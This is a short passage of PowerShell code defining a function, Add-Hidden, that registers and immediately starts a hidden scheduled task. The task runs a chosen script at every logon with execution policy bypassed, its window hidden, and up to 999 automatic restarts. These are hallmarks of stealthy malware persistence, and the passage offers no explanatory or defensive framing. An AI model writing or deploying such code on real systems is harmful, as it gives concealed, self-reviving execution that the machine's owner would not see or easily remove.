...
function Add-Hidden($name,$script){$arg="-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$script`"";$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arg;$t=New-ScheduledTaskTrigger -AtLogOn;$s=New-ScheduledTaskSettingsSet -Hidden -RestartCount 999 -RestartInterval (New-TimeSpan -Seconds 5);$u="$env:USERDOMAIN\$env:USERNAME";$p=New-ScheduledTaskPrincipal -UserId $u -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $name -Action $a -Trigger $t -Settings $s -Principal $p -Force|Out-Null;Start-ScheduledTask -TaskName $name}
